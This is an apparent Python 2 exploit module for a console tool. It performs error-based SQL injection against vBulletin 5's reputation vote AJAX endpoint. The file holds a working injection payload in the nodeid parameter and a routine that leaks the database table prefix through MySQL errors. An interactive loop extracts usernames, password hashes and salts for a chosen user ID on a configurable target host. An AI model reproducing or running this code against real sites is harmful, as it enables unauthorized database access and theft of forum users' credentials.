#!/usr/bin/env python
from includes.termcolor import colored
import urllib
import urllib2
import httplib
import re
import HTMLParser
import urlparse
import json


def get_server_status_code(url):
    host, path = urlparse.urlparse(url)[1:3]
    try:
        conn = httplib.HTTPConnection(host)
        conn.request('HEAD', path)
        return conn.getresponse().status
    except StandardError:
        return False
 
def check_url(url):
    good_codes = [httplib.OK, httplib.FOUND, httplib.MOVED_PERMANENTLY]
    return get_server_status_code(url) in good_codes

def get_table_prefix(url, threadid):
	postdata = [
	('nodeid', threadid+"'")
	]
	postdata = urllib.urlencode(postdata)
	request = urllib2.Request(url, postdata)
	response = urllib2.urlopen(request).read()
	if 'MySQL Error' in response:
		prefix = re.search('IN(.*?)node', response).group(1).strip()
		if len(prefix) != 0:
			print ('Table prefix found: '+prefix)
		else:
			print ('No table prefix was found.')
	else:
		print ('The exploit was unsuccessful. Therefore no prefix was found.')
		print ('Check all vars and make sure they are correct.')
		print ('If everything is correct the site is probably not vuln.')

def initiate():
	exvars = [
	['HOST', 'Not Set', 'Host of target with http://!'],
	['PATH', '/forums', 'Path to forums on target host'],
	['TABLE', 'user', 'User table to extract data from'],
	['USERID', '1', 'Userid of to extract data for'],
	['THREADID', '12', 'ID of valid thread'],
	['COLUMNS', 'username,password,salt', 'Columns to extract data for. Seperate with a comma!!'],
	['SEPERATOR', ':', 'Seperator to seperate columns']
	]

	print ('\nType help for more information')
	while True:
		try:
			vb5input = raw_input('vbconsole('+colored('/exploits/vb5', 'red')+')> ')
			if vb5input == 'exit':
				print ("Going back to home.")
				break
			elif vb5input == 'help':
				print ('show vars ~> Shows variables needed to run exploit and their current values')
				print ('set {VAR NAME} {VAR VALUE} ~> Set {VAR NAME} to {VAR VALUE}')
				print ('get prefix ~> Will search for table prefix')
				print ('run ~> Run the exploit')
				print ('exit ~> Go back to vBconsole home')
			elif vb5input == 'show vars':
				print ("Variables needed to run exploit.\n")
				count = 0
				while count < len(exvars):
					print (exvars[count][0]+" = "+exvars[count][1]+" ("+exvars[count][2]+")")
					count += 1
			elif vb5input[0:3] == 'set':
				setvar = vb5input.split(' ')[1]
				setval = vb5input.split(' ')[2:]
				count = 0
				while count < len(exvars):
					if exvars[count][0] == setvar:
						exvars[count][1] = " ".join(setval)
					count += 1
			elif vb5input == 'get prefix':
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"index.php/ajax/api/reputation/vote"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"index.php/ajax/api/reputation/vote"
				else:
					path = exvars[1][1]+"/index.php/ajax/api/reputation/vote"
				url = host+path
				if check_url(url):
					get_table_prefix(url, exvars[4][1])
				else:
					print ('Vote system could not be found at: '+url)
			elif vb5input == 'run':
				columns = exvars[5][1].split(',')
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"index.php/ajax/api/reputation/vote"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"index.php/ajax/api/reputation/vote"
				else:
					path = exvars[1][1]+"/index.php/ajax/api/reputation/vote"
				url = host+path
				if check_url(url):
					results = []
					for cols in columns:
						postdata = [
						('nodeid', exvars[4][1]+") and(select 1 from(select count(*),concat((select (select (SELECT concat("+cols+") FROM "+exvars[2][1]+" WHERE userid="+exvars[3][1]+" LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (1338=1338")
						]
						postdata = urllib.urlencode(postdata)
						request = urllib2.Request(url, postdata)
						response = urllib2.urlopen(request).read()
						if 'Duplicate entry' in response:
							getresult = re.compile('Duplicate entry(.*?)for', re.DOTALL |  re.IGNORECASE).findall(str(response))
							result = getresult[0].strip()
							result = result.strip("'")
							code = 0
						elif 'MySQL Error' in response:
							getresult = re.compile('MySQL Error(.*?)Error Number', re.DOTALL |  re.IGNORECASE).findall(str(response))
							result = getresult[0].strip()
							result = result.strip(':')
							result = result.strip()
							result = result.strip('\\t')
							result = result.strip('\\n')
							code = 1
						else:
							code = 2

						if code == 0:
							h = HTMLParser.HTMLParser()
							unescaped = h.unescape(result)
							if unescaped.endswith('1'):
								print (cols+': '+unescaped.strip('1'))
								results.append(unescaped.strip('1'))
							else:
								print (cols+': '+unescaped)
								results.append(unescaped)
						elif code == 1:
							print ('MySQL Error: '+result)
						else:
							print ('Exploit was unsuccessful!')
							print ('There could be various reasons for this:')
							print ('The userid you chose could be invalid')
							print ('I have also had sites not work without www. during testing')
							break
					if len(results) != 0:
						line = exvars[6][1].join(results)
						print ('\n'+line)
				else:
					print ('Vote system could not be found at: '+url)

		except KeyboardInterrupt:
			print ("\nGoing back to home.")
			break
